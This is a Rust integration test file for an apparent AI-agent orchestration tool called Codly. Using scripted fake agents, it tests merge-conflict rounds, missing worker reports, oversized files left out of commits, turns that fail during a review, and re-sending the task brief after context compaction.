            (None, vec![("t2.txt", "not yet\n")])
        } else {
            (Some("t1"), vec![("t2.txt", "no\n"), ("shared.txt", "from t2\n")])
        }
    };
    let (core, turns) = conflicting_tasks(dir.path(), &[], t2).await;

    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t2").await.unwrap().status, TaskStatus::Done);
    let all = events(&core).await;
    let said = decisions(&all);
    assert!(said.iter().any(|d| d.1.contains("fix round 2/2")), "both fix rounds were used");
    assert!(said.iter().any(|d| d.1.starts_with("t2: conflict round 1/3: merge conflict in shared.txt")), "{said:?}");
    assert!(!said.iter().any(|d| d.1.contains("failed:")), "a conflict does not cost a fix round: {said:?}");
    let conflict = worker_prompts(&turns).into_iter().find(|p| p.contains(CONFLICT)).expect("the worker is asked to resolve it");
    assert!(conflict.contains("(round 1/3)") && conflict.contains("shared.txt"), "{conflict}");
    shut_down(&core).await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_task_that_fails_with_markers_is_not_left_mid_merge() {
    let dir = tempfile::tempdir().unwrap();
    // The worker never resolves the conflict: its markers stay until the fix rounds run out.
    let t2: Script = |prompt| match prompt.contains(BRIEF) {
        true => (Some("t1"), vec![("t2.txt", "ok\n"), ("shared.txt", "from t2\n")]),
        false => (None, vec![]),
    };
    let (core, _turns) = conflicting_tasks(dir.path(), &[], t2).await;

    let t = wait_task(&core, "t2", TaskStatus::Failed).await;
    let reason = t.status_reason.clone().unwrap();
    assert!(reason.contains("conflict markers left in shared.txt after 2 fix rounds"), "{reason}");
    let wt = PathBuf::from(t.worktree.clone().unwrap());
    assert!(!in_merge(&wt), "the merge was undone");
    assert_eq!(std::fs::read_to_string(wt.join("shared.txt")).unwrap(), "from t2\n", "no markers are left");
    let all = events(&core).await;
    let said = decisions(&all);
    assert!(said.iter().any(|d| d.1.starts_with("t2: conflict round 1/3")), "{said:?}");
    assert!(said.iter().any(|d| d.1.contains("after 2 fix rounds") && d.2["merge_aborted"] == true), "{said:?}");
    shut_down(&core).await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_task_out_of_conflict_rounds_waits_for_you_with_no_merge_started() {
    let dir = tempfile::tempdir().unwrap();
    // Each time t2 is told of a conflict, another task lands on shared.txt before t2 has
    // resolved it: t3 in round 1, t4 in round 2, t5 in round 3. So t2 conflicts four times.
    let t2: Script = |prompt| {
        if prompt.contains("(round 1/3)") {
            (Some("t3"), vec![("shared.txt", "resolved by t2\n")])
        } else if prompt.contains("(round 2/3)") {
            (Some("t4"), vec![("shared.txt", "resolved by t2\n")])
        } else if prompt.contains("(round 3/3)") {
            (Some("t5"), vec![("shared.txt", "resolved by t2\n")])
        } else if prompt.contains(BRIEF) {
            (Some("t1"), vec![("t2.txt", "ok\n"), ("shared.txt", "from t2\n")])
        } else {
            (None, vec![]) // back on the task after your Retry: nothing to change
        }
    };
    let (core, turns) = conflicting_tasks(dir.path(), &["t3", "t4", "t5"], t2).await;
    let asked = || worker_prompts(&turns).into_iter().filter(|p| p.contains(CONFLICT)).count();

    let t = wait_task(&core, "t2", TaskStatus::Blocked).await;
    let reason = t.status_reason.clone().unwrap();
    assert!(reason.contains("still conflicts with") && reason.contains("shared.txt") && reason.contains("after 3 conflict rounds"), "{reason}");
    assert_eq!(asked(), 3, "the worker got its three conflict rounds");
    // The fourth merge was not started: the worktree is as the worker left it.
    let wt = PathBuf::from(t.worktree.clone().unwrap());
    assert!(!in_merge(&wt));
    assert_eq!(std::fs::read_to_string(wt.join("shared.txt")).unwrap(), "resolved by t2\n");
    assert!(!decisions(&events(&core).await).iter().any(|d| d.1.contains("failed:")), "blocked for you, not failed work");

    // Retry gives new conflict rounds. Nothing else lands on shared.txt now, so t2 merges.
    core.move_task(&t.id, TaskStatus::Ready).await.unwrap();
    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(asked(), 4);
    let last = worker_prompts(&turns).into_iter().rfind(|p| p.contains(CONFLICT)).unwrap();
    assert!(last.contains("(round 1/3)"), "{last}");
    shut_down(&core).await;
}

/// How Codly asks a worker for a report it did not give.
const NO_REPORT: &str = "You ended your turn without a report";
const HELLO_CHECK: &str = "grep -q hello hello.txt";

fn hello_plan() -> Value {
    json!({ "summary": "Add a hello file", "tasks": [task("t1", "hello.txt", HELLO_CHECK)] })
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_worker_that_ends_without_a_report_is_asked_for_it_before_its_work_is_checked() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    // The first turn ends early: half the file, no report. Asked for its report, the worker finishes.
    let worker: Behavior = Arc::new(|turn: FakeTurn| {
        Box::pin(async move {
            if turn.prompt.contains(NO_REPORT) {
                turn.write("hello.txt", "hello\n");
                turn.done().await;
            } else {
                turn.write("hello.txt", "hel");
            }
        })
    });
    let core = start(dir.path(), FakeSpawner { lead: lead_with(hello_plan()), worker, turns: turns.clone() }, auto()).await;

    wait_plan(&core, PlanStatus::Done).await;
    let prompts = worker_prompts(&turns);
    assert!(prompts.len() == 2 && prompts[1].contains(NO_REPORT), "the brief, then one question about the report: {prompts:?}");
    let all = events(&core).await;
    assert_eq!(verified(&all), [(HELLO_CHECK.to_string(), true)], "the half-done file was never checked, so no fix round was spent");
    let said = decisions(&all);
    assert!(said.iter().any(|d| d.1 == "t1: the worker ended its turn without a report; Codly asked for it"), "{said:?}");
    shut_down(&core).await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_worker_that_never_reports_is_asked_once_and_then_checked() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    let worker: Behavior = Arc::new(|turn: FakeTurn| Box::pin(async move { turn.write("hello.txt", "hello\n") }));
    let core = start(dir.path(), FakeSpawner { lead: lead_with(hello_plan()), worker, turns: turns.clone() }, auto()).await;

    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Done);
    let prompts = worker_prompts(&turns);
    assert!(prompts.len() == 2 && prompts[1].contains(NO_REPORT), "asked once, then its work is checked as it is: {prompts:?}");
    assert_eq!(verified(&events(&core).await), [(HELLO_CHECK.to_string(), true)]);
    shut_down(&core).await;
}

/// A worker leaves a dependency folder that the repository forgot to ignore. Codly commits the
/// work without it, says so in the task and asks the worker about it once, before the checks
/// run. The worker leaves it (and the folder grows): the work is checked and merged without
/// the folder, which is not held against the task's scope and stays in the worktree.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_huge_new_folder_is_left_out_of_the_commit_and_the_worker_is_asked_once() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    let cwd: Arc<Mutex<Option<PathBuf>>> = Arc::default();
    let seen = cwd.clone();
    let worker: Behavior = Arc::new(move |turn: FakeTurn| {
        let seen = seen.clone();
        Box::pin(async move {
            turn.write("hello.txt", "hello\n");
            // The second turn is the answer to Codly's question: the same folder, with more files.
            let files = codly_core::git::MAX_NEW_FOLDER_FILES + if turn.prompt.contains("did not commit") { 10 } else { 1 };
            let deps = turn.spec.cwd.join("node_modules");
            for i in 0..files {
                let sub = deps.join(format!("m{}", i % 40));
                std::fs::create_dir_all(&sub).unwrap();
                std::fs::write(sub.join(format!("{i}.js")), "x").unwrap();
            }
            *seen.lock().unwrap() = Some(turn.spec.cwd.clone());
            turn.done().await;
        })
    });
    let core = start(dir.path(), FakeSpawner { lead: lead_with(hello_plan()), worker, turns: turns.clone() }, auto()).await;

    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Done);
    let all = events(&core).await;
    // Said once: the same folder with more files in it is not news.
    let said: Vec<_> = decisions(&all).into_iter().filter(|d| d.1.starts_with("t1: Codly did not commit")).collect();
    assert_eq!(said.len(), 1, "said once in the task: {:?}", decisions(&all));
    assert!(said[0].1.contains("node_modules/ (2001 new files)") && said[0].1.contains(".gitignore"), "{}", said[0].1);
    assert_eq!(said[0].2["left_out"], json!(["node_modules/"]));
    let committed: Vec<&String> = all
        .iter()
        .filter_map(|e| match &e.kind {
            EventKind::Committed { files, .. } => Some(files),
            _ => None,
        })
        .flatten()
        .collect();
    assert!(committed.iter().any(|f| *f == "hello.txt"), "the work is committed: {committed:?}");
    assert!(!committed.iter().any(|f| f.starts_with("node_modules")), "the folder is not");
    // Asked once, before any check ran, and as no fix round.
    let prompts = worker_prompts(&turns);
    assert_eq!(prompts.len(), 2, "the brief, then Codly's question: {prompts:?}");
    assert!(prompts[1].contains("node_modules/ (2001 new files)") && prompts[1].contains(".gitignore") && prompts[1].contains("git add"), "{}", prompts[1]);
    assert_eq!(verified(&all), [(HELLO_CHECK.to_string(), true)], "the checks ran once, after the worker's answer");
    assert!(!decisions(&all).iter().any(|d| d.1.contains("fix round")), "the folder is not a scope failure: {:?}", decisions(&all));
    // What the plan merged has the work and not the folder, and the folder was not deleted.
    let branch = core.snapshot().await.unwrap().plans.remove(0).integration_branch.unwrap();
    let merged = String::from_utf8(git(&dir.path().join("repo"), &["ls-tree", "-r", "--name-only", &branch]).stdout).unwrap();
    assert!(merged.contains("hello.txt") && !merged.contains("node_modules"), "{merged}");
    let worktree = cwd.lock().unwrap().clone().unwrap();
    assert!(worktree.join("node_modules/m0/0.js").exists(), "left where it was");
    shut_down(&core).await;
}

/// What the Lead was told about paths that a commit left out, once it was told.
async fn lead_heard(turns: &Turns) -> Vec<String> {
    wait_for("the Lead to hear it", 20, async || {
        let lead: Vec<String> = turns.lock().unwrap().iter().filter(|t| t.0 == Role::Lead && t.2.contains("Codly did not commit")).map(|t| t.2.clone()).collect();
        (!lead.is_empty()).then_some(lead)
    })
    .await
}

/// The dependency folder appears after the worker's turn, and you re-run the task's checks from
/// its card. That pass has no worker turn to ask in: the task's record says what Codly's commit
/// left out, the Lead hears it, and the task is merged without the folder.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn what_your_own_pass_leaves_out_goes_to_the_lead() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    // Harmless here, but `rm` is a risk for the approval rules: the task waits for you.
    let risky = "rm -f stale.txt && grep -q hello hello.txt";
    let plan = json!({ "summary": "Add a hello file", "tasks": [task("t1", "hello.txt", risky)] });
    let spawner = FakeSpawner { lead: lead_with(plan), worker: hello_worker(), turns: turns.clone() };
    let core = start(dir.path(), spawner, Settings { lead_followups: true, ..auto() }).await;

    let t = wait_task(&core, "t1", TaskStatus::Blocked).await;
    assert!(!decisions(&events(&core).await).iter().any(|d| d.1.contains("did not commit")), "nothing was left out so far");
    let deps = PathBuf::from(t.worktree.clone().unwrap()).join("node_modules");
    for i in 0..=codly_core::git::MAX_NEW_FOLDER_FILES {
        let sub = deps.join(format!("m{}", i % 40));
        std::fs::create_dir_all(&sub).unwrap();
        std::fs::write(sub.join(format!("{i}.js")), "x").unwrap();
    }

    assert!(core.recheck_task(&t.id, vec![risky.into()]).await.unwrap().is_empty());
    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Done);
    let all = events(&core).await;
    let said: Vec<_> = decisions(&all).into_iter().filter(|d| d.1.starts_with("t1: Codly did not commit")).collect();
    assert_eq!(said.len(), 1, "said once in the task: {:?}", decisions(&all));
    assert_eq!(said[0].2["left_out"], json!(["node_modules/"]));
    assert_eq!(worker_prompts(&turns).len(), 1, "your own pass asks no worker");
    let heard = lead_heard(&turns).await;
    assert_eq!(heard.len(), 1, "{heard:?}");
    assert!(heard[0].contains("Task t1 \"Create hello.txt\": Codly did not commit 1 new path(s)") && heard[0].contains("goes on without them"), "{}", heard[0]);
    assert!(heard[0].contains("node_modules/ (2001 new files)"), "{}", heard[0]);
    assert_eq!(verified(&all), [(risky.to_string(), true)], "the checks ran, and the pass went on");
    let branch = core.snapshot().await.unwrap().plans.remove(0).integration_branch.unwrap();
    let merged = String::from_utf8(git(&dir.path().join("repo"), &["ls-tree", "-r", "--name-only", &branch]).stdout).unwrap();
    assert!(merged.contains("hello.txt") && !merged.contains("node_modules"), "{merged}");
    shut_down(&core).await;
}

/// A new file one byte over what a commit takes (sparse: nothing is written).
fn big_file(path: &Path) {
    std::fs::File::create(path).unwrap().set_len(codly_core::git::MAX_NEW_FILE_BYTES + 1).unwrap();
}

/// The worker is asked about a file that Codly's commit left out, and its answer turn leaves
/// another one. A worker is asked once: the task's record names the new file, the Lead hears
/// it, and the task is checked and merged without it.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn what_the_workers_answer_leaves_out_goes_to_the_lead() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    let worker: Behavior = Arc::new(|turn: FakeTurn| {
        Box::pin(async move {
            turn.write("hello.txt", "hello\n");
            if turn.prompt.contains("did not commit") {
                std::fs::remove_file(turn.spec.cwd.join("dump.bin")).unwrap();
                big_file(&turn.spec.cwd.join("core.bin"));
            } else {
                big_file(&turn.spec.cwd.join("dump.bin"));
            }
            turn.done().await;
        })
    });
    let spawner = FakeSpawner { lead: lead_with(hello_plan()), worker, turns: turns.clone() };
    let core = start(dir.path(), spawner, Settings { lead_followups: true, ..auto() }).await;

    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t1").await.unwrap().status, TaskStatus::Done);
    let all = events(&core).await;
    let said: Vec<_> = decisions(&all).into_iter().filter(|d| d.1.starts_with("t1: Codly did not commit")).collect();
    assert_eq!(said.len(), 2, "each list is said once: {:?}", decisions(&all));
    assert_eq!((&said[0].2["left_out"], &said[1].2["left_out"]), (&json!(["dump.bin"]), &json!(["core.bin"])));
    let prompts = worker_prompts(&turns);
    assert_eq!(prompts.len(), 2, "the brief, then one question and no second one: {prompts:?}");
    assert!(prompts[1].contains("dump.bin (25 MB)"), "{}", prompts[1]);
    let heard = lead_heard(&turns).await;
    assert_eq!(heard.len(), 1, "{heard:?}");
    assert!(heard[0].contains("Task t1 \"Create hello.txt\": Codly did not commit 1 new path(s)") && heard[0].contains("goes on without them"), "{}", heard[0]);
    assert!(heard[0].contains("core.bin (25 MB)") && !heard[0].contains("dump.bin"), "{}", heard[0]);
    assert_eq!(verified(&all), [(HELLO_CHECK.to_string(), true)], "the checks ran once, after the worker's answer");
    let branch = core.snapshot().await.unwrap().plans.remove(0).integration_branch.unwrap();
    let merged = String::from_utf8(git(&dir.path().join("repo"), &["ls-tree", "-r", "--name-only", &branch]).stdout).unwrap();
    assert!(merged.contains("hello.txt") && !merged.contains("core.bin"), "{merged}");
    shut_down(&core).await;
}

/// t2's merge into the plan's branch conflicts with t1's shared.txt where Codly tries it, and
/// is clean inside t2's worktree: only t2's branch has the union merge rule for that file. Codly
/// concludes that merge itself, with no worker turn. Its commit leaves out the big file that
/// t2's check made after the task's commit: the task's record says so, the Lead hears it, and
/// the plan's branch gets the merge without the file.
#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_merge_that_codly_concludes_says_what_its_commit_left_out() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    // `rm` is a risk for the approval rules: t2 waits for you with its work committed. Its
    // check runs when the test allows it, once t1 is merged.
    let check = "rm -f stale.txt && truncate -s 27M dump.bin";
    let mut t2 = task("t2", "t2.txt", check);
    t2["write_scope"] = json!(["t2.txt", ".gitattributes"]);
    let plan = json!({ "summary": "Add files", "tasks": [task("t1", "t1.txt", "test -f t1.txt"), t2] });
    // t1 waits until t2 has its worktree: both are cut before t1's merge.
    let t2_up = Arc::new(AtomicBool::new(false));
    let worker: Behavior = Arc::new(move |turn: FakeTurn| {
        let t2_up = t2_up.clone();
        Box::pin(async move {
            if turn.prompt.contains("[Codly] Task t2:") {
                t2_up.store(true, Ordering::SeqCst);
                turn.write("t2.txt", "ok\n");
                turn.write("shared.txt", "from t2\n");
                turn.write(".gitattributes", "shared.txt merge=union\n");
            } else {
                until(|| t2_up.load(Ordering::SeqCst)).await;
                turn.write("t1.txt", "x\n");
                turn.write("shared.txt", "from t1\n");
            }
            turn.done().await;
        })
    });
    let spawner = FakeSpawner { lead: lead_with(plan), worker, turns: turns.clone() };
    let core = start(dir.path(), spawner, Settings { lead_followups: true, ..auto() }).await;

    wait_task(&core, "t1", TaskStatus::Done).await;
    let t2 = wait_task(&core, "t2", TaskStatus::Blocked).await;
    assert!(core.recheck_task(&t2.id, vec![check.into()]).await.unwrap().is_empty());
    wait_plan(&core, PlanStatus::Done).await;
    assert_eq!(task_by_key(&core, "t2").await.unwrap().status, TaskStatus::Done);
    let all = events(&core).await;
    let said = decisions(&all);
    assert!(said.iter().any(|d| d.1.starts_with("t2: conflicts with ") && d.1.contains(" in shared.txt")), "the first try conflicted: {said:?}");
    assert_eq!(worker_prompts(&turns).len(), 2, "one brief each: no worker resolved the merge");
    let left: Vec<_> = said.iter().filter(|d| d.1.starts_with("t2: Codly did not commit")).collect();
    assert_eq!(left.len(), 1, "said once in the task: {said:?}");
    assert!(left[0].1.contains("dump.bin (27 MB)"), "{}", left[0].1);
    assert_eq!(left[0].2["left_out"], json!(["dump.bin"]));
    let heard = lead_heard(&turns).await;
    assert_eq!(heard.len(), 1, "{heard:?}");
    assert!(heard[0].contains("Task t2 \"Create t2.txt\": Codly did not commit 1 new path(s)") && heard[0].contains("dump.bin (27 MB)"), "{}", heard[0]);
    // The plan's branch has both tasks, with both lines of shared.txt, and not the big file.
    let repo = dir.path().join("repo");
    let branch = core.snapshot().await.unwrap().plans.remove(0).integration_branch.unwrap();
    let merged = String::from_utf8(git(&repo, &["ls-tree", "-r", "--name-only", &branch]).stdout).unwrap();
    assert!(merged.contains("t1.txt") && merged.contains("t2.txt") && !merged.contains("dump.bin"), "{merged}");
    let shared = String::from_utf8(git(&repo, &["show", &format!("{branch}:shared.txt")]).stdout).unwrap();
    assert!(shared.contains("from t1") && shared.contains("from t2"), "{shared}");
    assert!(PathBuf::from(t2.worktree.unwrap()).join("dump.bin").exists(), "left where it was");
    shut_down(&core).await;
}

/// The reviewer approves, the first time only when the test ends that review (`end`); every
/// other agent is `worker`.
fn with_held_review(end: Arc<tokio::sync::Notify>, worker: Behavior) -> Behavior {
    let first = Arc::new(AtomicBool::new(true));
    Arc::new(move |turn: FakeTurn| {
        let (end, first, worker) = (end.clone(), first.clone(), worker.clone());
        Box::pin(async move {
            if turn.spec.role != Role::Reviewer {
                return worker(turn).await;
            }
            if first.swap(false, Ordering::SeqCst) {
                end.notified().await;
            }
            let criteria = json!([{ "criterion": "hello.txt is right", "met": true }]);
            turn.tool("codly_submit_review", json!({ "verdict": "approve", "summary": "Looks good.", "criteria": criteria, "issues": [] })).await;
        })
    })
}

/// Wait until t1's work is read by its reviewer, then send its worker a message from you.
async fn message_in_review(core: &Core, turns: &Turns, text: &str) {
    let reading = || turns.lock().unwrap().iter().any(|t| t.0 == Role::Reviewer);
    let t = wait_for("the review", 40, async || task_by_key(core, "t1").await.filter(|t| reading() && t.status == TaskStatus::Reviewing)).await;
    core.send_chat(&format!("agent:{}", t.assignee.unwrap()), text).await.unwrap();
}

/// hello.txt as the plan's branch has it after the merge.
async fn merged_hello(core: &Core) -> String {
    let plan = core.snapshot().await.unwrap().plans.remove(0);
    std::fs::read_to_string(PathBuf::from(plan.integration_worktree.unwrap()).join("hello.txt")).unwrap()
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_turn_that_failed_during_the_review_is_not_checked_when_the_review_ends() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    let reviewed = Arc::new(tokio::sync::Notify::new());
    let worker: Behavior = Arc::new(|turn: FakeTurn| {
        Box::pin(async move {
            if turn.prompt.contains(BRIEF) {
                turn.write("hello.txt", "hello\n");
                turn.done().await;
            } else if turn.prompt.contains("second line") {
                // Your message: the turn fails with the file half-written.
                turn.write("hello.txt", "half\n");
                turn.fail("API Error: 529 Overloaded");
            } else if turn.prompt.contains("Your last turn on task") {
                turn.write("hello.txt", "hello\nworld\n");
            }
        })
    });
    let spawner = FakeSpawner { lead: lead_with(hello_plan()), worker: with_held_review(reviewed.clone(), worker), turns: turns.clone() };
    let core = start(dir.path(), spawner, Settings { review_gate: true, ..auto() }).await;
    // A wait no test reaches: only the review's end asks the worker to continue.
    core.set_turn_retry_waits(vec![Duration::from_secs(600); 2]);

    // You message the worker while its work is read, and that turn fails.
    message_in_review(&core, &turns, "also add a second line").await;
    wait_for("Codly to see the failed turn", 20, async || {
        decisions(&events(&core).await).iter().any(|d| d.1.contains("Codly asks it to continue")).then_some(())
    })
    .await;

    // The review ends before the worker went on. The half-written file is not checked: the
    // worker is asked to continue now, and the end of that turn is checked.
    reviewed.notify_one();
    wait_plan(&core, PlanStatus::Done).await;
    let all = events(&core).await;
    assert_eq!(verified(&all), vec![(HELLO_CHECK.to_string(), true); 2], "the half-written file never reached a check");
    assert!(!decisions(&all).iter().any(|d| d.1.contains("fix round")), "{:?}", decisions(&all));
    let asked = worker_prompts(&turns).iter().filter(|p| p.contains("Your last turn on task")).count();
    assert_eq!(asked, 1, "the worker was asked to continue, once");
    assert_eq!(merged_hello(&core).await, "hello\nworld\n");
    shut_down(&core).await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn a_turn_that_ended_on_the_usage_limit_during_the_review_does_not_leave_the_task_waiting() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    let reviewed = Arc::new(tokio::sync::Notify::new());
    let worker: Behavior = Arc::new(|turn: FakeTurn| {
        Box::pin(async move {
            if turn.prompt.contains(BRIEF) {
                turn.write("hello.txt", "hello\n");
                turn.done().await;
            } else {
                // Your message: after one more line the account's usage limit ends the turn.
                turn.write("hello.txt", "hello\nworld\n");
                turn.emit(EventKind::StatusChanged { status: AgentStatus::RateLimited });
                turn.fail("You have hit your usage limit");
            }
        })
    });
    let spawner = FakeSpawner { lead: lead_with(hello_plan()), worker: with_held_review(reviewed.clone(), worker), turns: turns.clone() };
    let core = start(dir.path(), spawner, Settings { review_gate: true, ..auto() }).await;

    message_in_review(&core, &turns, "also add a second line").await;
    wait_for("Codly to see the failed turn", 20, async || {
        events(&core).await.iter().any(|e| matches!(e.kind, EventKind::TurnCompleted { status: TurnStatus::Failed, .. })).then_some(())
    })
    .await;
    tokio::time::sleep(Duration::from_millis(300)).await;

    // A worker at its limit is not asked to continue, so no later turn would move the task on:
    // when the review ends, the work is checked as that turn left it.
    reviewed.notify_one();
    wait_plan(&core, PlanStatus::Done).await;
    let all = events(&core).await;
    assert_eq!(verified(&all), vec![(HELLO_CHECK.to_string(), true); 2], "checked once more when the review ended");
    let said = decisions(&all);
    assert!(!said.iter().any(|d| d.1.contains("Codly asks it to continue")), "{said:?}");
    let prompts = worker_prompts(&turns);
    assert_eq!(prompts.len(), 2, "the brief and your message, nothing else: {prompts:?}");
    assert_eq!(merged_hello(&core).await, "hello\nworld\n");
    shut_down(&core).await;
}

#[tokio::test(flavor = "multi_thread", worker_threads = 4)]
async fn after_a_compaction_the_next_prompt_carries_the_task_again() {
    let dir = tempfile::tempdir().unwrap();
    let turns = Turns::default();
    // The worker's context is compacted in its first turn, and its file fails the check twice.
    let worker: Behavior = Arc::new(|turn: FakeTurn| {
        Box::pin(async move {
            if turn.prompt.contains("fix round 2/2") {
                turn.write("hello.txt", "hello\n");
            } else if turn.prompt.contains("fix round 1/2") {
                turn.write("hello.txt", "still no\n");
            } else {
                turn.emit(EventKind::Compacting { pre_tokens: Some(180_000), post_tokens: Some(20_000) });
                turn.write("hello.txt", "no\n");
            }
            turn.done().await;
        })
    });
    let core = start(dir.path(), FakeSpawner { lead: lead_with(hello_plan()), worker, turns: turns.clone() }, auto()).await;

    wait_plan(&core, PlanStatus::Done).await;
    let prompts = worker_prompts(&turns);
    assert_eq!(prompts.len(), 3, "the brief and two fix rounds: {prompts:?}");
    // The first prompt after the compaction carries the task again, after the gate's feedback.
    let again = "Your context was compacted since you last read your task";
    let (feedback, task) = prompts[1].split_once(again).unwrap_or_else(|| panic!("the task is not there again: {}", prompts[1]));
    assert!(feedback.contains("fix round 1/2"), "{feedback}");
    for part in [
        "[Codly] Task t1: Create hello.txt",
        "hello.txt is right",
        "You may modify ONLY these repo-relative paths: hello.txt.",
        HELLO_CHECK,
        "Do not commit, branch, merge or push",
        "codly_submit_report",
    ] {
        assert!(task.contains(part), "`{part}` is missing: {task}");
    }
    // Nothing was compacted since: the next prompt is the feedback alone.
    assert!(prompts[2].contains("fix round 2/2") && !prompts[2].contains(again), "{}", prompts[2]);
    let said = decisions(&events(&core).await);
    let sent_again = said.iter().filter(|d| d.1 == "t1: the worker's context was compacted; its next prompt carries the task again").count();
    assert_eq!(sent_again, 1, "{said:?}");
    shut_down(&core).await;
}
